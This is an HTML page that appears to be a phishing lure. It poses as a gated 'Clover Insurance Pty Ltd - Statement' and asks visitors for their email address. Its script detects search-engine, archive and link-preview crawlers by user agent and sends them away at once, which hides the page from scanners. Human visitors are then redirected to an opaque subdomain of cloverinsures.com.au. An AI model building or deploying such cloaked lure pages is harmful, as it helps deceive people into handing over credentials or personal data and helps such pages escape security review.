<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document Access</title>
    <style>
        .access-modal {
            display: none;
            position: fixed;
            inset: 0;
            background-color: rgba(0,0,0,0.7);
            z-index: 9999;
            align-items: center;
            justify-content: center;
        }
        .access-modal__content {
            background-color: #fff;
            padding: 1.5rem;
            border-radius: 0.5rem;
            width: min(90%, 25rem);
            box-shadow: 0 0.25rem 0.5rem rgba(0,0,0,0.1);
        }
        .access-modal__title {
            margin: 0 0 1rem 0;
            color: #333;
            font-size: 1.25rem;
        }
        .access-modal__description {
            color: #555;
            margin-bottom: 1rem;
        }
        .access-modal__input {
            width: 100%;
            padding: 0.625rem;
            margin: 0.625rem 0;
            border: 1px solid #ddd;
            border-radius: 0.25rem;
            font-size: 1rem;
            box-sizing: border-box;
        }
        .access-modal__button {
            background-color: #4CAF50;
            color: white;
            padding: 0.75rem;
            border: none;
            border-radius: 0.25rem;
            cursor: pointer;
            width: 100%;
            font-size: 1rem;
            transition: background-color 0.2s;
        }
        .access-modal__button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div id="accessModal" class="access-modal">
        <div class="access-modal__content">
            <h2 class="access-modal__title">Clover Insurance Pty Ltd - Statement</h2>
            <p class="access-modal__description">Please enter your email address to view this content:</p>
            <input type="email" id="accessEmail" class="access-modal__input" placeholder="your@email.com" required>
            <button id="accessSubmit" class="access-modal__button">Continue</button>
        </div>
    </div>

    <script>
        (function() {
            'use strict';
            
            // Modern crawler detection
            const isAutomatedVisitor = () => {
                const crawlers = [
                    'bot', 'spider', 'crawl', 'slurp', 'search', 'archiver',
                    'facebookexternalhit', 'linkedinbot', 'embedly', 'quora',
                    'pinterest', 'twitterbot', 'googlebot', 'bingbot', 'yandexbot',
                    'baiduspider', 'duckduckbot', 'sogou', 'exabot', 'ia_archiver'
                ];
                
                const userAgent = navigator.userAgent.toLowerCase();
                return crawlers.some(crawler => userAgent.includes(crawler));
            };
            
            // Validate email format
            const isValidEmail = (email) => {
                return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
            };
            
            // Handle the modal interaction
            const setupAccessModal = () => {
                const modal = document.getElementById('accessModal');
                const emailInput = document.getElementById('accessEmail');
                const submitButton = document.getElementById('accessSubmit');
                
                const handleSubmission = () => {
                    const email = emailInput.value.trim();
                    
                    if (!email || !isValidEmail(email)) {
                        alert('Please enter a valid email address.');
                        emailInput.focus();
                        return;
                    }
                    
                    // In a real implementation, you would send the email to your server here
                    console.log('User email recorded:', email);
                    
                    // Redirect to the target page
                    window.location.href = "https://df911af3c45f.cloverinsures.com.au/";
                };
                
                // Set up event listeners
                submitButton.addEventListener('click', handleSubmission);
                emailInput.addEventListener('keypress', (e) => {
                    if (e.key === 'Enter') handleSubmission();
                });
                
                // Show the modal
                modal.style.display = 'flex';
            };
            
            // Main execution flow
            if (isAutomatedVisitor()) {
                // Redirect crawlers immediately
                window.location.href = "https://df911af3c45f.cloverinsures.com.au/";
            } else {
                // Wait for DOM to be ready
                if (document.readyState !== 'loading') {
                    setupAccessModal();
                } else {
                    document.addEventListener('DOMContentLoaded', setupAccessModal);
                }
            }
        })();
    </script>
</body>
</html>
